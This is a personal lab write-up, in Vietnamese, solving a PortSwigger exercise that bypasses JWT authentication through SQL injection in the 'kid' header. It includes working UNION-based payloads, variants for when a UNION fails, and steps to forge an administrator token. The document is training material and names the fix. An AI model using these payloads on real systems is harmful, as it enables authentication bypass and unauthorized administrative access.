![[jwt-kid-sqli.png]]
-mô tả lab: `kid` bị ghép thẳng vào câu SQL lấy key. Mình inject để server trả về secret do mình chọn, rồi ký token bằng nó. Bài khoai nhất topic JWT.

> [!NOTE]
> -test bằng `wiener:peter`. Lab: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-sql-injection

### hướng giải
- [ ] mình login rồi decode JWT, header `{"kid":"abcd1234","alg":"HS256"}`
- [ ] mình thử `kid` thành `abcd' AND '1'='1` rồi ký bừa, sau đó quan sát gói tin trả về, mình thấy behavior khác giữa true/false -> đúng là SQLi trong `kid`
- [ ] mình đoán query kiểu: `SELECT key FROM jwt_keys WHERE kid = '<kid>'`. Nếu mình UNION ra 1 dòng chứa secret mình chọn thì server sẽ verify bằng secret đó
- [ ] => mình ép query trả về `'mysecret'`, rồi ký token admin bằng `'mysecret'` là khớp

### giải
-bước 1: mình dò quote trong Repeater bằng cách sửa `kid` (ký bừa cho đủ format, quan trọng là quan sát response/error):
```
kid = abcd'           -> lỗi SQL / 500 (có quote)
kid = abcd'--         -> khác (comment ăn)
```
-xác nhận inject được rồi mình dùng UNION:
```
kid = x' UNION SELECT 'mysecret'--
```
![[jwt-kid-union.png]]
-tùy code lab mà quote là `'` hay `"`, số cột SELECT mấy cột. Mình thử `UNION SELECT 'mysecret'` trước, fail thì thêm cột `NULL` (`UNION SELECT 'mysecret',NULL...`) hoặc bọc comment `#`/`-- ` (nhớ dấu cách sau `--`).

-bước 2: khi response hết báo invalid key (tức query đã trả về `mysecret`), mình ký token trong JWT Editor:
- header giữ `kid` = payload inject y hệt bước 1
- payload `{"iss":"portswigger","sub":"administrator","exp":9999999999}`
- ký HS256 với secret `mysecret`.

-bước 3: thay cookie, GET `/admin` -> 200, xóa carlos là solve.

> [!NOTE]
> -vì sao làm được: server tin `kid` từ client + ghép SQL + dùng kết quả làm key. 3 lỗi cộng lại.
> -mẹo của mình khi UNION fail: thử `' UNION SELECT 'mysecret';-- -`, đổi `'` thành `"`, thêm `NULL` cho đủ cột, hoặc dùng `LIMIT`. Cứ soi response trong Repeater là ra.
> -fix: `kid` whitelist + query parameterized, không bao giờ để 2 cái này gặp nhau.
